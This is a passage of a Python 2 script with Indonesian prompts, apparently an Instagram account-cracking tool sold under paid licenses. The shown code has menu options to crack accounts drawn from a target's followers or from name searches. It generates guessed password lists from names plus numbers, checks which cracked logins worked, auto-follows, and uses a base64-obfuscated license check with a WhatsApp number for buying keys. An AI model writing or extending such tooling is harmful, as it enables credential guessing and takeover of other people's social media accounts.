			pass
	fol_nano = base64.b64decode(bokepp)
	followerz = base64.b64decode(fol_tam)
	wak_ = base64.b64decode(("MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==")).split()
	fol_nano = " [++] AUTHOR : YumasaaXSmrn X Mr JeeckXNano\n" # Ultimited
	print fol_nano + " [++] BROTHER : XNX-CODE Team 2021\n"
#	print fol_tamzz
	wak_ = " [++] XNXCODE\n".split()
#	followerz = ""
	print followerz + " [++] XXZYZZXY"
	followerzz = fol_nano.replace("U", "")
	q=followerzz
	y=""
	followerzz = base64.b64decode(fol_tam)
_uyuk_()
def pilihan(pil):
	global username_get_follow,post_
	proses_crack = h+" * "+p+"Tunggu proses Crack...!"
	post_=y
	if pil == "1":
		pas = ""
		status = ""
		username = raw_input(a+"\n ?"+p+" Masukkan Username Target"+h+": ")
		info_nano(username, pas, status)
		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username+p+" >> "+k+str(mengikuti)
		print garis
		pil2 = raw_input(a+" ?"+p+" Pilih"+k+": ")
		limit = input(a+" ?"+p+" Masukkan Limit"+k+": ")
		if pil2 == "1":
			data_follower_nano(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		elif pil2 == "2":
			data_follower_nano(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		else:
			pass
	elif pil == "2":
		print garis
		usr_ = raw_input(a+" ?"+p+" Masukkan Nama"+k+": ")
		jm = input(a+" $"+p+" Masukkan Jumlah"+h+": ")
		us = usr_.replace(" ", "")
		pencarian_.append("jeeck_nano")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for nano in range(1, jm+1):
			data_.append(us+str(nano)+"==>"+us)
			data_.append(us+"_"+str(nano)+"==>"+us)
			data_.append(us+str(nano)+"_"+"==>"+us)
		print ""
		print proses_crack
		print "\n"
		crack()
	elif pil == "3":
		crack_target()
	elif pil == "4":
		cek_hasil()
	elif pil == "5":
		pas = ""
		status = ""
		status_foll.append("jeecknano")
		print garis
		username_get_follow = raw_input(a+"  ?"+p+" Masukkan Username Target"+k+": ")
		info_nano(username_get_follow, pas, status)
		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username_get_follow+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username_get_follow+p+" >> "+k+str(mengikuti)
		print garis
		raw_input(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m [ ENTER ]")
		print garis
		data_follower_nano(cookie, id_, limit=1000000000, opsi="1")
		pil_nano = "auto_follow"
		auto_follow(pil_nano)
	elif pil == "6":
		print("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m please wait broo\n")
		pil_nano = "jeeck_nano"
		auto_follow(pil_nano)
	elif pil == "7":
		import os
		try:
#			os.system("git clone https://github.com/jeecknano/insta_nano")
#			os.system("rm -rf insta_nano.py")
#			os.system("rm -rf install.py")
#			os.system("cp -f insta_nano/* \\.")
#			os.system("rm -rf insta_nano")
#			os.system("chmod 777 *")
			print h+"\n Sukses Update Tool.."+p+">_<\n"
		except:
			print "\n Perangkat Tidak Suport\n"
	elif pil == "8":
		kel = raw_input(k+" > Yakin Mau Keluar dari akun Instagram? "+p+"y/n"+h+": ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " > Keluar...."
		else:
			print h+" > Silahkan Jalankan lagi toolnya.."
	elif pil == "hapus_premium":
		hapus_cokiz()
		print p+"\n >_"+h+" Premium Telah Dihapus...\n"
	else:
		print m+" Pilih yang benar...."
# Mau Ngapain Cuk?
baner = """
    __  __ ____  ______ _____ _____ 
   |  \/  |  _ \|  ____|_   _/ ____|
   | \  / | |_) | |__    | || |  __ 
   | |\/| |  _ <|  __|   | || | |_ |
   | |  | | |_) | |     _| || |__| |
   |_|  |_|____/|_|    |_____\_____|
"""
def menu_nano():
	pil_kon = []
	print "\n"
	belum_premium = a+" ["+p+"@"+a+"] "+m+"Belum Premium:( "
	print baner
	print h+" [++]"+h+" Author:"+k+" YumasaaXSmrn X Mr JeeckXNano "
	print h+" [++]"+h+" Team:"+k+" XNX-CODE Team 2021 "
	try:
		if followerz == followerzz:
			try:
				tgl = datetime.datetime.now()
				bln = tgl.month
				thn = tgl.year
				day = tgl.day
				mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))
				seles = datetime.date(thn, bln, day)
				sisa = mulai - seles
				lim_nano_id = str(sisa).split()[0]
				if "U" in fol_nano:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+p+"Unlimited"
				else:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+k+lim_nano_id+" "+p+"Hari lagi"
					if ":" in str(lim_nano_id) or "-" in str(lim_nano_id):
						hapus_cokiz()
						print " Kamu sudah melebihi batas pemakaian\n Silahkan hubungi admin untuk order Lisensinya lagi"
						pil_kon.append("jeecknano")
			except:
				hapus_cokiz()	
		else:
			print belum_premium
	except:
		print belum_premium
#	print garis
#	print a+" ["+k+"1"+a+"] "+p+"Crack dari followers Publik"
#	print a+" ["+k+"2"+a+"] "+p+"Crack dari Pencarian Orang"
#	print a+" ["+k+"3"+a+"] "+p+"Crack Target"#
#	print a+" ["+k+"4"+a+"] "+p+"Cek hasil"+h+" OK"+a+"/"+k+"CP"
#	print a+" ["+k+"5"+a+"] "+p+"Auto Followers"
#	print a+" ["+k+"6"+a+"] "+h+"Cek Login hasil Akun"+k+" CP"
##	print a+" ["+k+"7"+a+"] "+p+"Update Tool"
#	print a+" ["+k+"7"+a+"] "+p+"Log Out Akun Instagram"
#	print garis
	print(" \033[0;36m[\033[0;33m01\033[0;36m]\033[0;36m Crack from followers public ")
	print(" \033[0;36m[\033[0;33m02\033[0;36m]\033[0;36m Crack from pencarian orang ")
	print(" \033[0;36m[\033[0;33m03\033[0;36m]\033[0;36m Crack target")
	print(" \033[0;36m[\033[0;33m04\033[0;36m]\033[0;36m Chek hasil ")
	print(" \033[0;36m[\033[0;33m05\033[0;36m]\033[0;36m Autho +++ FOLLOWERS")
	print(" \033[0;36m[\033[0;33m06\033[0;36m]\033[0;36m Chek login akun")
	print(" \033[0;36m[\033[0;33m07\033[0;36m]\033[0;36m Update tools")
	print(" \033[0;36m[\033[0;33m08\033[0;36m]\033[0;36m Log out akun instagram")
	if len(pil_kon) != 1:
		pil = raw_input("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m input : ")
	else:
		pil = "upgrade_premium"
	try:
		
		if followerz == followerzz:
			pilihan(pil)
		else:
			print m+" Belum Premium......"
			pil = "upgrade_premium"
	except NameError:
		print k+"\n >< Harus Premium.....!\n"
		pil = "upgrade_premium"
	if pil == "upgrade_premium":
		dat_ke = str(random.randint(12312, 999999999999999))
		try:
			open("cokiz.txt", "r").read()
		except IOError:
			_yuk_(dat_ke)
		_uyuk_()
		id_key = base64.b64encode(followerz.replace("O", ""))
		no_wa = "628812457948"
		print h+" Ikuti Arahannya..."
		print p+"""
	Chat Admin untuk beli lisensi, 
	kirimkan Tool Key nya ke Admin, 
	untuk Konfirmasi Lisensinya,
	No WhatsApp Admin =>"""+k+""" 628812457948	\n"""
		print h+" >- "+p+"1 Bulan "+k+"100k"
		print h+" >- "+p+"Permanen/Unlimited "+k+"300k"
		print h+" >- "+p+"No Dana/OVO "+a+"==> "+k+"08812457948"
		try:
			print p+"\n Berikan "+a+"Tool Key"+p+" ke Admin,\n kirim bukti pembayarnnya\n untuk Konfirmasi Lisensi"
			subprocess.check_output(["am", "start", "https://wa.me/"+no_wa+"?text=*Tool%20Key:%20"+id_key+"*\nAssalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Tool%20Instagram!"])
		except:
			pass
		print a+"-"*40
		print p+" >>> Tool Key "+k+"==> "+h+id_key
		print a+"-"*40
		try:
			f = raw_input(p+" >_"+h+" Masukkan Lisensinya"+k+": ")
			
			z = ""
			for jeeck_nano in f.split("%"):
				try:
					z += jeeck_nano[0]
				except:
					pass
			print z
			print followerz
			if base64.b32decode(z) == followerz or base64.b32decode(z) == followerz+"U":
				with open("cokiz.txt", "a") as tulis_:
					tgl = datetime.datetime.now()
					bln = tgl.month
					thn = tgl.year
					day = tgl.day
					jm_hari = str(monthrange(thn,bln)).replace("(", "").replace(")", "").split()[1]
					tgls = str(thn)+" "+str(bln+1)+" "+str(day)
					if "12" in str(bln):
						bln = 1
						thn = thn+1
						tgls = str(thn)+" "+str(bln)+" "+str(day)
					tulis_.write(">"+f+">"+p1+"%>"+base64.b64encode(tgls))
					print a+"\n Lisensi Suksess...\n"
			else:
				print m+"\n Lisensi Salah...\n"
		except:
			print m+"\n Lisensi Salah...\n"
# Mau Ngapain Cuk?
if __name__=="__main__":
	cek_login()
	menu_nano()
